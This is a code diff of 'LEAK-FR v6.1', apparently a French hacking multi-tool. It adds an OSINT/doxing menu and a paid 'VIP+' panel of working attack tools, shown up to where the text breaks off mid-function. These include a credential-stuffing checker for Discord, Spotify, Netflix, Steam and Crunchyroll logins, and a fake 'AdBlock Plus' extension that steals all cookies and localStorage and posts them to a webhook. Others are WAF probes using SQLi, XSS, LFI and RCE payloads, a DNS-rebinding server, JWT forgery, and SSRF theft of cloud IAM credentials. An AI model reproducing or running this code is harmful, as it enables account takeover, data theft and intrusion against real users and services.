@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 # ========================================================================
-#   LEAK-FR v6.0  |  By 31300-leak-fr  |  Blood Edition  |  Tiers+
+#   LEAK-FR v6.1  |  By 31300-leak-fr  |  Blood Edition  |  Tiers+
 # ========================================================================
 
 import os, sys, json, re, time, socket, random, string, hashlib, platform
@@ -42,11 +42,10 @@ R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE; M = Fore.MAGENTA
 C = Fore.CYAN; W = Fore.WHITE
 DIM = Style.DIM; BRT = Style.BRIGHT; RST = Style.RESET_ALL
 OK = f"{G}[+]{RST}"; ERR = f"{R}[x]{RST}"; INF = f"{Y}[~]{RST}"
-VERSION = "6.0"
+VERSION = "6.1"
 
-# Tier global + branding custom (maj par _is_activated)
 _TIER = "free"
-_BRAND = ""           # pseudo AMI affiche dans le banner
+_BRAND = ""
 _TIER_ORDER = {"free": 0, "vip": 1, "vip+": 2, "ami": 3, "owner": 4}
 
 
@@ -69,8 +68,7 @@ def fg(n): return f'{CSI}38;5;{n}m'
 BLOOD_DEEP = fg(52); BLOOD_DARK = fg(88); BLOOD = fg(124)
 BLOOD_MID = fg(160); BLOOD_BRIGHT = fg(196); BLOOD_LIGHT = fg(203)
 BLOOD_PALE = fg(210); ASH = fg(245); GHOST = fg(238)
-GOLD = fg(220); GOLD_DARK = fg(136); AMI_COL = fg(213)
-PLUS_COL = fg(51)
+GOLD = fg(220); GOLD_DARK = fg(136); AMI_COL = fg(213); PLUS_COL = fg(51)
 
 CAT_MALWARE = fg(214); CAT_SCAN = fg(196); CAT_PANEL = fg(51); CAT_NETWORK = fg(46)
 CAT_MALWARE_DARK = fg(130); CAT_SCAN_DARK = fg(88)
@@ -189,17 +187,16 @@ def leakfr_banner():
     print("")
     print(" " * pad_sub + BOLD_ANSI + BLOOD_LIGHT + SUBTITLE + RESET_ANSI)
 
-    # badge tier + branding AMI
     if _TIER == "owner":
-        badge = f" {GOLD}◆ OWNER{ RESET_ANSI }"
+        badge = f" {GOLD}◆ OWNER{RESET_ANSI}"
     elif _TIER == "ami":
-        badge = f" {AMI_COL}◆ AMI{ RESET_ANSI }"
+        badge = f" {AMI_COL}◆ AMI{RESET_ANSI}"
     elif _TIER == "vip+":
-        badge = f" {PLUS_COL}◆ VIP+{ RESET_ANSI }"
+        badge = f" {PLUS_COL}◆ VIP+{RESET_ANSI}"
     elif _TIER == "vip":
-        badge = f" {BLOOD_BRIGHT}◆ VIP{ RESET_ANSI }"
+        badge = f" {BLOOD_BRIGHT}◆ VIP{RESET_ANSI}"
     else:
-        badge = f" {GHOST}· free{ RESET_ANSI }"
+        badge = f" {GHOST}· free{RESET_ANSI}"
     if _BRAND and _TIER in ("ami", "owner"):
         badge += f"  {AMI_COL}[{_BRAND}]{RESET_ANSI}"
     pad_b = max(0, (W_ - _vlen(badge)) // 2)
@@ -247,6 +244,7 @@ def net_menu():
             ("6", "DNS Lookup"), ("7", "Subdomain Scanner"),
             ("8", "Header Grabber"), ("9", "Traceroute"),
             ("10", "Reverse IP"), ("11", "URL Scanner"),
+            ("12", "MAC Vendor Lookup"),
             ("0", "Retour")])
         c = input(f"  {R}>{RST} ").strip()
         if c == "1": net_ip()
@@ -260,6 +258,7 @@ def net_menu():
         elif c == "9": net_trace()
         elif c == "10": net_revip()
         elif c == "11": net_url()
+        elif c == "12": net_mac_vendor()
         elif c == "0": break
 
 
@@ -387,9 +386,83 @@ def net_url():
     pause()
 
 
+def net_mac_vendor():
+    banner_s("MAC VENDOR LOOKUP")
+    mac = ask("Adresse MAC (xx:xx:xx:xx:xx:xx):").upper().replace("-", ":")
+    oui = mac.replace(":", "")[:6].upper()
+    if len(oui) < 6:
+        print(f"{ERR} MAC invalide."); pause(); return
+    try:
+        r = requests.get(f"https://api.macvendors.com/{oui}", timeout=8)
+        if r.status_code == 200:
+            print(f"\n  {Y}OUI{RST}    : {W}{oui}{RST}")
+            print(f"  {Y}Vendor{RST} : {G}{r.text.strip()}{RST}")
+        else:
+            print(f"{INF} Non trouve ({r.status_code})")
+    except Exception as e: print(f"{ERR} {e}")
+    pause()
+
+
 # ========================================================================
 # OSINT
 # ========================================================================
+def osint_menu():
+    while True:
+        menu_box("OSINT", [
+            ("1", "Username Tracker"), ("2", "Email OSINT"),
+            ("3", "Phone OSINT"), ("4", "Google Dorking"),
+            ("5", "Image EXIF"), ("6", "D0x Create"),
+            ("7", "D0x Tracker"), ("8", "Instagram OSINT"),
+            ("9", "TikTok OSINT"), ("10", "Snapchat OSINT"),
+            ("11", "Twitter/X OSINT"), ("12", "Face Recon"),
+            ("13", "Steam ID"), ("14", "Shodan Dorking"),
+            ("15", "WHOIS Lookup"), ("16", "IP Geolocation+"),
+            ("0", "Retour")])
+        c = input(f"  {R}>{RST} ").strip()
+        if c == "1": osint_user()
+        elif c == "2": osint_email()
+        elif c == "3": osint_phone()
+        elif c == "4": osint_dork()
+        elif c == "5": osint_exif()
+        elif c == "6": osint_dox()
+        elif c == "7": osint_dox_tr()
+        elif c == "8": osint_insta()
+        elif c == "9": osint_tiktok()
+        elif c == "10": osint_snap()
+        elif c == "11": osint_tw()
+        elif c == "12": osint_face()
+        elif c == "13": osint_steam()
+        elif c == "14": osint_shodan()
+        elif c == "15": osint_whois()
+        elif c == "16": osint_ip_geo()
+        elif c == "0": break
+
+
+def osint_ip_geo():
+    banner_s("IP GEOLOCATION+")
+    ip = ask("IP (vide pour ton IP):")
+    if not ip:
+        try: ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+        except: ip = ""
+    if not ip: print(f"{ERR} Impossible."); pause(); return
+    print(f"\n{INF} Target: {Y}{ip}{RST}\n")
+    sources = [
+        ("ip-api.com", f"http://ip-api.com/json/{ip}?fields=66846719"),
+        ("ipinfo.io", f"https://ipinfo.io/{ip}/json"),
+        ("freeipapi", f"https://freeipapi.com/api/json/{ip}"),
+    ]
+    for name, url in sources:
+        try:
+            d = jget(url, timeout=6)
+            if "error" in d or not d: continue
+            print(f"  {BLOOD_MID}-- {name} --{RESET_ANSI}")
+            for k, v in list(d.items())[:12]:
+                print(f"    {Y}{str(k):<16}{RST} {W}{str(v)[:70]}{RST}")
+            print()
+        except: pass
+    pause()
+
+
 def osint_user():
     banner_s("USERNAME TRACKER")
     u = ask("Username:")
@@ -407,13 +480,11 @@ def osint_user():
     hdrs = {"User-Agent": "Mozilla/5.0"}
     import concurrent.futures
     print(f"\n{INF} Check {len(sites)} sites...\n ")
-
     def ck(n, url):
         try:
             r = requests.get(url, timeout=6, headers=hdrs, allow_redirects=True)
             return (r.status_code == 200 and not any(x in r.text.lower()[:2048] for x in nf), n, url)
         except Exception: return (False, n, url)
-
     found = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
         for ok_, n, url in ex.map(lambda x: ck(*x), sites.items()):
@@ -627,37 +698,6 @@ def osint_whois():
         _pip("python-whois"); print(f"{INF} Relance.")
     except Exception as e: print(f"{ERR} {e}")
     pause()
-
-
-def osint_menu():
-    while True:
-        menu_box("OSINT", [
-            ("1", "Username Tracker"), ("2", "Email OSINT"),
-            ("3", "Phone OSINT"), ("4", "Google Dorking"),
-            ("5", "Image EXIF"), ("6", "D0x Create"),
-            ("7", "D0x Tracker"), ("8", "Instagram OSINT"),
-            ("9", "TikTok OSINT"), ("10", "Snapchat OSINT"),
-            ("11", "Twitter/X OSINT"), ("12", "Face Recon"),
-            ("13", "Steam ID"), ("14", "Shodan Dorking"),
-            ("15", "WHOIS Lookup"),
-            ("0", "Retour")])
-        c = input(f"  {R}>{RST} ").strip()
-        if c == "1": osint_user()
-        elif c == "2": osint_email()
-        elif c == "3": osint_phone()
-        elif c == "4": osint_dork()
-        elif c == "5": osint_exif()
-        elif c == "6": osint_dox()
-        elif c == "7": osint_dox_tr()
-        elif c == "8": osint_insta()
-        elif c == "9": osint_tiktok()
-        elif c == "10": osint_snap()
-        elif c == "11": osint_tw()
-        elif c == "12": osint_face()
-        elif c == "13": osint_steam()
-        elif c == "14": osint_shodan()
-        elif c == "15": osint_whois()
-        elif c == "0": break
 
 
 # ========================================================================
@@ -1120,7 +1160,8 @@ def discord_menu():
         elif c == "31": dc_report()
         elif c == "0": break
 
-      # ========================================================================
+
+# ========================================================================
 # VC DISCORD
 # ========================================================================
 def _vc_join(t, g, c, hold=3):
@@ -2817,7 +2858,7 @@ def hwid_menu():
         elif c == "0": break
 
 
-  # ========================================================================
+# ========================================================================
 # VIP PANEL
 # ========================================================================
 def vip_tokens():
@@ -3283,7 +3324,7 @@ def vip_session_grab():
             try:
                 _shutil.copy2(cookie, f"1-Output/cookies_{name.lower()}.db")
                 print(f"  {G}[OK]{RST} {name}"); found.append(name)
-            except Exception as e: print(f"  {Y}[SKIP]{RST} {name}")
+            except Exception: print(f"  {Y}[SKIP]{RST} {name}")
     print(f"\n{OK} {len(found)} navigateurs." if found else f"{INF} Aucun.")
     pause()
 
@@ -3309,9 +3350,8 @@ def vip_roblox_enrich():
 def vip_menu():
     banner_s("VIP PANEL")
     if not _has_tier("vip"):
-        print(f"  {R}[X]{RST} Acces reserve aux licences VIP+.")
+        print(f"  {R}[X]{RST} Acces reserve aux licences VIP et superieures.")
         print(f"  {DIM}Tier actuel : {W}{_TIER}{RESET_ANSI}")
-        print(f"  {DIM}Contacte l'owner pour upgrader ta cle.{RESET_ANSI}")
         pause(); return
     _page_loader(f"Ouverture VIP ({_TIER})")
     while True:
@@ -3351,45 +3391,727 @@ def vip_menu():
 
 
 # ========================================================================
-# VIP+ PANEL -- FEATURES EXCLUSIVES
+# VIP+ PANEL -- 19 OUTILS EXCLUSIFS
 # ========================================================================
-def vipx_dork_forge():
-    banner_s("AI DORK FORGE")
-    print(f"  {DIM}Genere des dorks cibles par categorie. Moteur local offline.{RST}\n")
-    cat = ask("[1]WordPress [2]Cameras [3]Printers [4]Backups [5].env/creds [6]Custom:", "1")
-    target = ask("Domaine ou laisser vide pour global:", "")
+def vipx_combo_validator():
+    banner_s("MULTI-SITE COMBO VALIDATOR")
+    cp = ask("Combo list (user:pass):")
+    if not os.path.isfile(cp): print(f"{ERR} Introuvable."); pause(); return
+    workers = ask_int("Threads:", 15)
+    print(f"  {Y}[1]{RST}Discord {Y}[2]{RST}Spotify {Y}[3]{RST}Netflix {Y}[4]{RST}Steam {Y}[5]{RST}Crunchyroll {Y}[6]{RST}Tous")
+    tgt = ask("Cible:", "6")
+    sites = {"1": ["discord"], "2": ["spotify"], "3": ["netflix"],
+             "4": ["steam"], "5": ["crunchyroll"],
+             "6": ["discord","spotify","netflix","steam","crunchyroll"]}.get(tgt, ["discord"])
+    combos = [l.strip() for l in open(cp, errors="ignore") if ":" in l and l.strip()]
+    if not combos: print(f"{ERR} Vide."); pause(); return
 
+    def _t_discord(u, p):
+        try:
+            r = requests.post("https://discord.com/api/v9/auth/login",
+                              json={"login": u, "password": p}, timeout=6)
+            return r.status_code == 200 and r.json().get("token")
+        except: return False
+    def _t_spotify(u, p):
+        try:
+            r = requests.post("https://accounts.spotify.com/api/login",
+                              data={"username": u, "password": p, "remember": "true"},
+                              headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
+            return r.status_code == 200
+        except: return False
+    def _t_netflix(u, p):
+        try:
+            r = requests.post("https://www.netflix.com/api/login",
+                              json={"userLoginName": u, "password": p}, timeout=6)
+            return r.status_code == 200 and "error" not in r.text.lower()[:200]
+        except: return False
+    def _t_steam(u, p):
+        try:
+            r = requests.post("https://store.steampowered.com/login/dologin/",
+                              data={"username": u, "password": p, "donotcache": int(time.time()*1000)}, timeout=6)
+            return r.status_code == 200 and r.json().get("success")
+        except: return False
+    def _t_crunchy(u, p):
+        try:
+            r = requests.post("https://sso.crunchyroll.com/api/v1/authenticate",
+                              json={"username": u, "password": p}, timeout=6)
+            return r.status_code == 200
+        except: return False
+    testers = {"discord": _t_discord, "spotify": _t_spotify, "netflix": _t_netflix,
+               "steam": _t_steam, "crunchyroll": _t_crunchy}
+    import concurrent.futures
+    hits = {s: [] for s in sites}
+    def worker(combo):
+        u, p = combo.split(":", 1); local = {}
+        for s in sites:
+            try:
+                if testers[s](u, p):
+                    local[s] = combo; print(f"  {G}[HIT {s.upper()}]{RST} {combo}")
+            except: pass
+            time.sleep(0.2)
+        return local
+    print(f"\n{INF} Test de {len(combos)} combos sur {len(sites)} sites...\n")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+        for res in ex.map(worker, combos):
+            for s, c in res.items(): hits[s].append(c)
+    print(f"\n{BLOOD_MID}-- RESULTATS --{RESET_ANSI}")
+    for s, lst in hits.items():
+        if lst: out(f"combo_hits_{s}.txt", "\n".join(lst))
+    pause()
+
+
+def vipx_rate_limiter():
+    banner_s("ADAPTIVE RATE LIMITER")
+    url = ask("URL a tester:")
+    method = ask("Methode (GET/POST):", "GET").upper()
+    print(f"\n{INF} Detection en cours...\n")
+    delays = [0.05, 0.1, 0.2, 0.5, 1.0]
+    results = {}
+    for d in delays:
+        codes = []
+        for _ in range(20):
+            try:
+                if method == "GET": r = requests.get(url, timeout=5)
+                else: r = requests.post(url, timeout=5)
+                codes.append(r.status_code)
+            except: codes.append(0)
+            time.sleep(d)
+        rl = sum(1 for c in codes if c == 429)
+        ok = sum(1 for c in codes if 200 <= c < 300)
+        results[d] = (ok, rl)
+        print(f"  {Y}delay={d}s{RST}  200={ok}/20  429={rl}/20")
+    best = None
+    for d in sorted(results.keys()):
+        if results[d][1] == 0: best = d; break
+    print(f"\n{OK} Delay optimal: {G}{best or 'inconnu'}s{RST}")
+    if best:
+        print(f"  {DIM}Cadence max : {int(1/best)} req/s{RST}")
+    pause()
+
+
+def vipx_waf_fingerprint():
+    banner_s("WAF FINGERPRINTER")
+    url = ask("URL cible:")
+    print(f"\n{INF} Fingerprinting WAF...\n")
+    try:
+        r0 = requests.get(url, timeout=8)
+        h0 = {k.lower(): v for k, v in r0.headers.items()}
+    except Exception as e:
+        print(f"{ERR} {e}"); pause(); return
+    signatures = {
+        "Cloudflare": ["cf-ray", "cf-cache-status"],
+        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id"],
+        "Akamai": ["x-akamai-transformed", "akamai-grn"],
+        "Sucuri": ["x-sucuri-id", "x-sucuri-cache"],
+        "Fastly": ["x-fastly-request-id", "x-served-by"],
+        "Imperva": ["x-iinfo", "x-cdn"],
+        "F5 BIG-IP": ["x-wa-info", "bigipserver"],
+    }
+    detected = []
+    for name, sigs in signatures.items():
+        for s in sigs:
+            if s in h0 or any(s in v.lower() for v in h0.values()):
+                detected.append(name); break
+    if not detected:
+        print(f"  {DIM}Aucune signature connue.{RST}")
+    else:
+        for d in set(detected): print(f"  {R}[WAF]{RST} {d}")
+    print(f"\n{Y}Test payloads actifs :{RST}")
+    payloads = [("SQL", "?id=1' OR '1'='1"), ("XSS", "?q=<script>alert(1)</script>"),
+                ("LFI", "?file=../../etc/passwd"), ("RCE", "?cmd=;cat /etc/passwd")]
+    blocked_n = 0
+    for name, pl in payloads:
+        try:
+            r = requests.get(url + pl, timeout=5)
+            hit = r.status_code in (403, 406, 429, 501) or "blocked" in r.text.lower()[:500]
+            if hit: blocked_n += 1
+            col = R if hit else DIM
+            print(f"  {col}[{'BLOCKED' if hit else '---'}]{RST} {name} (status {r.status_code})")
+        except: pass
+    print(f"\n{BLOOD_MID}-- VERDICT --{RESET_ANSI}")
+    if blocked_n >= 3:
+        print(f"  {R}WAF agressif{RST} - bypass necessaire")
+    elif blocked_n >= 1:
+        print(f"  {Y}WAF partiel{RST} - bypass conditionnel")
+    else:
+        print(f"  {G}WAF faible{RST} - payloads passent")
+    pause()
+
+
+def vipx_dns_rebind():
+    banner_s("DNS REBINDING SERVER")
+    domain = ask("Domaine que tu controles:", "rebind.local")
+    ip1 = ask("IP 1 (initiale):")
+    ip2 = ask("IP 2 (apres rebind):", "127.0.0.1")
+    port = ask_int("Port DNS:", 53)
+    if not ip1: print(f"{ERR} IP 1 requise."); pause(); return
+    code = f'''# -*- coding: utf-8 -*-
+# DNS Rebinding - alterne 2 IP pour le meme domaine
+import socket, struct, threading, time
+
+DOMAIN = "{domain}"
+IP1 = "{ip1}"
+IP2 = "{ip2}"
+PORT = {port}
+flip = [0]
+
+def parse_qname(data, offset):
+    parts = []
+    while True:
+        ln = data[offset]
+        if ln == 0: break
+        offset += 1
+        parts.append(data[offset:offset+ln].decode("ascii", errors="ignore"))
+        offset += ln
+    return ".".join(parts).lower(), offset + 1
+
+def build_response(query, qname, qtype, qclass):
+    tid = query[:2]
+    flags = b"\\x81\\x80"
+    qdcount = b"\\x00\\x01"
+    ancount = b"\\x00\\x01" if qtype == 1 else b"\\x00\\x00"
+    header = tid + flags + qdcount + ancount + b"\\x00\\x00" + b"\\x00\\x00"
+    q_bytes = query[12:]
+    q_end = q_bytes.find(b"\\x00")
+    question = query[12:12 + q_end + 5]
+    if qtype != 1: return header + question
+    flip[0] = (flip[0] + 1) % 2
+    ip = IP1 if flip[0] == 0 else IP2
+    ip_bytes = socket.inet_aton(ip)
+    answer = b"\\xc0\\x0c" + b"\\x00\\x01" + b"\\x00\\x01"
+    answer += struct.pack(">I", 0) + b"\\x00\\x04" + ip_bytes
+    return header + question + answer
+
+def handle(data, addr, sock):
+    try:
+        if len(data) < 12: return
+        qname, offset = parse_qname(data, 12)
+        if offset + 4 > len(data): return
+        qtype = struct.unpack(">H", data[offset:offset+2])[0]
+        qclass = struct.unpack(">H", data[offset+2:offset+4])[0]
+        if DOMAIN not in qname: return
+        resp = build_response(data, qname, qtype, qclass)
+        sock.sendto(resp, addr)
+        print(f"[{{time.strftime('%H:%M:%S')}}] {{qname}} -> {{IP1 if flip[0]==0 else IP2}}")
+    except Exception as e: print("err:", e)
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.bind(("0.0.0.0", PORT))
+    print(f"DNS Rebinding sur :{{PORT}} pour {{DOMAIN}}")
+    print(f"Alterne {{IP1}} et {{IP2}}")
+    while True:
+        try:
+            data, addr = s.recvfrom(512)
+            threading.Thread(target=handle, args=(data, addr, s), daemon=True).start()
+        except KeyboardInterrupt: break
+
+main()
+'''
+    os.makedirs("1-Output", exist_ok=True)
+    p = "1-Output/dns_rebind_server.py"
+    open(p, "w", encoding="utf-8").write(code)
+    print(f"\n{OK} -> {Y}{p}{RST}")
+    print(f"  {DIM}Lance sur un VPS. Configure ns1.{domain} = IP du VPS.{RST}")
+    pause()
+
+
+def vipx_ext_dropper():
+    banner_s("BROWSER EXTENSION DROPPER")
+    wh = ask("Webhook de reception:")
+    name = ask("Nom extension:", "AdBlock Plus")
+    manifest = json.dumps({
+        "manifest_version": 3, "name": name, "version": "1.0.0",
+        "description": "Bloqueur de publicites haute performance",
+        "permissions": ["cookies", "storage", "tabs", "webRequest", "<all_urls>", "scripting"],
+        "host_permissions": ["<all_urls>"],
+        "background": {"service_worker": "bg.js"},
+        "action": {"default_popup": "popup.html"}
+    }, indent=2)
+    bg_js = f'''// background service worker
+const WEBHOOK = "{wh}";
+async function collect() {{
+    const out = {{cookies: [], storage: [], ts: Date.now(), ua: navigator.userAgent}};
+    try {{
+        const cks = await chrome.cookies.getAll({{}});
+        out.cookies = cks.map(c => `${{c.domain}} | ${{c.name}} = ${{c.value.slice(0,80)}}`);
+    }} catch(e) {{}}
+    try {{
+        const tabs = await chrome.tabs.query({{}});
+        for (const t of tabs) {{
+            if (!t.url || !t.url.startsWith("http")) continue;
+            try {{
+                const res = await chrome.scripting.executeScript({{
+                    target: {{tabId: t.id}},
+                    func: () => {{
+                        const items = {{}};
+                        for (let i = 0; i < localStorage.length; i++) {{
+                            const k = localStorage.key(i);
+                            items[k] = (localStorage.getItem(k) || "").slice(0, 500);
+                        }}
+                        return {{host: location.hostname, items}};
+                    }}
+                }});
+                if (res[0] && res[0].result) out.storage.push(res[0].result);
+            }} catch(e) {{}}
+        }}
+    }} catch(e) {{}}
+    try {{
+        await fetch(WEBHOOK, {{
+            method: "POST",
+            headers: {{"Content-Type": "application/json"}},
+            body: JSON.stringify({{embeds: [{{
+                title: "extension harvest", color: 0xFF0000,
+                fields: [
+                    {{name: "Cookies", value: "```" + out.cookies.slice(0, 20).join("\\n").slice(0, 1000) + "```"}},
+                    {{name: "Storage", value: "```" + JSON.stringify(out.storage).slice(0, 1000) + "```"}}
+                ],
+                timestamp: new Date().toISOString()
+            }}]}})
+        }});
+    }} catch(e) {{}}
+}}
+chrome.runtime.onInstalled.addListener(collect);
+chrome.runtime.onStartup.addListener(collect);
+setInterval(collect, 5 * 60 * 1000);
+'''
+    popup = f'''<!DOCTYPE html><html><head><meta charset="UTF-8">
+<style>body{{width:260px;font-family:sans-serif;padding:16px;margin:0}}
+h3{{margin:0 0 8px}}p{{color:#666;font-size:12px;margin:4px 0}}</style></head>
+<body><h3>{name}</h3><p>Blocage actif</p><p style="color:#999;font-size:11px">v1.0.0</p></body></html>'''
+    base = f"1-Output/ext_{name.replace(' ','_')}"
+    os.makedirs(base, exist_ok=True)
+    open(f"{base}/manifest.json", "w").write(manifest)
+    open(f"{base}/bg.js", "w").write(bg_js)
+    open(f"{base}/popup.html", "w").write(popup)
+    print(f"\n{OK} Extension -> {Y}{base}/{RST}")
+    print(f"  {DIM}Chrome : chrome://extensions -> Load unpacked{RST}")
+    pause()
+
+
+def vipx_git_miner():
+    banner_s("GIT HISTORY SECRET MINER")
+    repo = ask("URL repo git:")
+    if not repo: pause(); return
+    tmp = f"1-Output/_gitmine_{int(time.time())}"
+    try:
+        print(f"{INF} Clone bare...")
+        r = subprocess.run(["git", "clone", "--bare", "--quiet", repo, tmp],
+                           capture_output=True, text=True, timeout=120)
+        if r.returncode != 0:
+            print(f"{ERR} {r.stderr[:200]}"); pause(); return
+    except Exception as e: print(f"{ERR} {e}"); pause(); return
+    patterns = {
+        "AWS Key": r"AKIA[0-9A-Z]{16}",
+        "Google API": r"AIza[0-9A-Za-z\-_]{35}",
+        "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
+        "Discord Token": r"[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}",
+        "Stripe Key": r"sk_live_[0-9a-zA-Z]{24,}",
+        "Private Key": r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
+        "JWT": r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
+        "Password": r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]([^'\"]{6,})['\"]",
+        "Secret": r"(?i)(secret|api_key|apikey|access_token)\s*[=:]\s*['\"]([^'\"]{8,})['\"]",
+    }
+    hits = {k: [] for k in patterns}
+    print(f"{INF} Scan de l'historique...\n")
+    try:
+        log = subprocess.run(["git", "--git-dir", tmp, "log", "--all", "-p", "--no-color"],
+                             capture_output=True, text=True, timeout=300).stdout
+    except Exception as e: print(f"{ERR} {e}"); pause(); return
+    for name, pat in patterns.items():
+        for m in re.finditer(pat, log):
+            val = m.group(0)[:120]
+            if val not in hits[name]:
+                hits[name].append(val)
+                if len(hits[name]) <= 5:
+                    print(f"  {R}[{name}]{RST} {Y}{val[:80]}{RST}")
+    total = sum(len(v) for v in hits.values())
+    print(f"\n{OK} {total} secrets uniques.")
+    for name, vals in hits.items():
+        if vals: out(f"gitmine_{name.replace(' ','_').lower()}.txt", "\n".join(vals))
+    _shutil.rmtree(tmp, ignore_errors=True)
+    pause()
+
+
+def vipx_jwt_forge():
+    banner_s("JWT FORGE + ATTACK")
+    print(f"  {Y}[1]{RST}Analyse  {Y}[2]{RST}Alg:none  {Y}[3]{RST}Kid inject  {Y}[4]{RST}HMAC brute")
+    c = ask("Action:", "1")
+    if c in ("1", "2", "3"):
+        tok = ask("JWT original:")
+        parts = tok.split(".")
+        if len(parts) != 3: print(f"{ERR} Invalide."); pause(); return
+        def _b64d(x):
+            x += "=" * ((4 - len(x) % 4) % 4)
+            return json.loads(base64.urlsafe_b64decode(x).decode())
+        try:
+            header = _b64d(parts[0]); payload = _b64d(parts[1])
+        except Exception as e: print(f"{ERR} {e}"); pause(); return
+        print(f"\n  {Y}Header{RST} : {json.dumps(header, indent=2)[:300]}")
+        print(f"  {Y}Payload{RST} : {json.dumps(payload, indent=2)[:500]}")
+        if c == "2":
+            h = dict(header); h["alg"] = "none"
+            h_b64 = base64.urlsafe_b64encode(json.dumps(h, separators=(",",":")).encode()).decode().rstrip("=")
+            p = dict(payload); p["admin"] = True
+            p_b64 = base64.urlsafe_b64encode(json.dumps(p, separators=(",",":")).encode()).decode().rstrip("=")
+            forged = f"{h_b64}.{p_b64}."
+            print(f"\n{OK} JWT alg:none :\n{G}{forged}{RST}")
+        elif c == "3":
+            kid = ask("Valeur kid (ex: ../../../../dev/null):")
+            h = dict(header); h["kid"] = kid; h["alg"] = "HS256"
+            h_b64 = base64.urlsafe_b64encode(json.dumps(h, separators=(",",":")).encode()).decode().rstrip("=")
+            p = dict(payload); p["admin"] = True
+            p_b64 = base64.urlsafe_b64encode(json.dumps(p, separators=(",",":")).encode()).decode().rstrip("=")
+            sig = base64.urlsafe_b64encode(
+                _hmac.new(b"", f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
+            ).decode().rstrip("=")
+            forged = f"{h_b64}.{p_b64}.{sig}"
+            print(f"\n{OK} JWT kid injecte :\n{G}{forged}{RST}")
+    elif c == "4":
+        tok = ask("JWT:")
+        wl_path = ask("Wordlist (chemin, vide=defaut):", "")
+        if wl_path and os.path.isfile(wl_path):
+            words = [w.strip() for w in open(wl_path, errors="ignore") if w.strip()]
+        else:
+            words = ["secret","password","123456","admin","jwt","key","changeit","supersecret"]
+        parts = tok.split(".")
+        msg = f"{parts[0]}.{parts[1]}".encode()
+        target = base64.urlsafe_b64decode(parts[2] + "==")
+        print(f"{INF} Brute sur {len(words)} mots...\n")
+        for w in words:
+            if _hmac.new(w.encode(), msg, hashlib.sha256).digest() == target:
+                print(f"  {G}[FOUND]{RST} {w}"); pause(); return
+        print(f"{ERR} Non trouve.")
+    pause()
+
+
+def vipx_subdomain_takeover():
+    banner_s("SUBDOMAIN TAKEOVER")
+    dom = ask("Domaine racine:")
+    subs_file = ask("Fichier sous-domaines (vide=auto):", "")
+    if subs_file and os.path.isfile(subs_file):
+        subs = [s.strip() for s in open(subs_file, errors="ignore") if s.strip()]
+    else:
+        subs = ["www","mail","api","dev","test","admin","blog","shop","store","app",
+                "staging","demo","cdn","static","assets","docs","status","support"]
+    fingerprints = {
+        "github.io": "There isn't a GitHub Pages site here",
+        "herokuapp.com": "No such app",
+        "amazonaws.com": "NoSuchBucket",
+        "azurewebsites.net": "Error 404 - Web app not found",
+        "surge.sh": "project not found",
+        "bitbucket.io": "Repository not found",
+        "shopify.com": "Sorry, this shop is currently unavailable",
+        "fastly.net": "Fastly error: unknown domain",
+    }
+    hits = []
+    print(f"{INF} Test de {len(subs)} sous-domaines...\n")
+    for s in subs:
+        fqdn = f"{s}.{dom}"
+        try:
+            ans = socket.gethostbyname_ex(fqdn)
+            cname = ans[0]
+            for svc, fp in fingerprints.items():
+                if svc in str(ans).lower() or svc in cname.lower():
+                    try:
+                        r = requests.get(f"http://{fqdn}", timeout=6)
+                        if fp.lower() in r.text.lower():
+                            print(f"  {R}[VULNERABLE]{RST} {fqdn} -> {svc}")
+                            hits.append(f"{fqdn} -> {svc}")
+                    except: pass
+        except: pass
+    print(f"\n{OK} {len(hits)} vulnerables.")
+    if hits: out(f"takeover_{dom}.txt", "\n".join(hits))
+    pause()
+
+
+def vipx_password_crack():
+    banner_s("PASSWORD PATTERN CRACKER")
+    base = ask("Password de base:", "")
+    if not base: pause(); return
+    mode = ask("[1]Genere variantes  [2]Crack hash:", "1")
+    if mode == "1":
+        variants = set()
+        subs = {"a":"@","e":"3","i":"1","o":"0","s":"$","t":"7","g":"9","l":"1"}
+        variants.update([base, base.lower(), base.upper(), base.capitalize(), base[::-1]])
+        leet = "".join(subs.get(c.lower(), c) for c in base)
+        variants.add(leet)
+        for suf in ["","1","12","123","1234","12345","2024","2025","!","!!","@","#"]:
+            variants.add(base + suf); variants.add(leet + suf)
+        for pre in ["","1","the","my"]:
+            variants.add(pre + base)
+        for k, v in subs.items():
+            variants.add(base.replace(k, v))
+        variants = sorted(v for v in variants if 3 <= len(v) <= 64)
+        print(f"\n{BLOOD_MID}-- {len(variants)} VARIANTES --{RESET_ANSI}\n")
+        for v in variants[:50]: print(f"  {G}{v}{RST}")
+        out(f"variants_{hashlib.md5(base.encode()).hexdigest()[:8]}.txt", "\n".join(variants))
+    elif mode == "2":
+        h = ask("Hash:").strip().lower()
+        alg = "md5" if len(h) == 32 else "sha1" if len(h) == 40 else "sha256"
+        words = ["password","123456","admin","qwerty","letmein","welcome","monkey",
+                 "abc123","1234","iloveyou","sunshine","princess","football","dragon"]
+        all_words = []
+        for w in words:
+            all_words.extend([w, w.capitalize(), w.upper(), w + "1", w + "123", w + "!"])
+        print(f"{INF} Test de {len(all_words)} candidats...\n")
+        for w in all_words:
+            if hashlib.new(alg, w.encode()).hexdigest() == h:
+                print(f"  {G}[FOUND]{RST} {alg}('{w}')"); pause(); return
+        print(f"{ERR} Non trouve.")
+    pause()
+
+
+def vipx_cloud_metadata():
+    banner_s("CLOUD METADATA EXTRACTOR")
+    ssrf_url = ask("URL SSRF vulnerable (avec ?url=):")
+    if not ssrf_url: pause(); return
+    targets = [
+        ("AWS IMDS base", "http://169.254.169.254/latest/meta-data/"),
+        ("AWS IAM creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
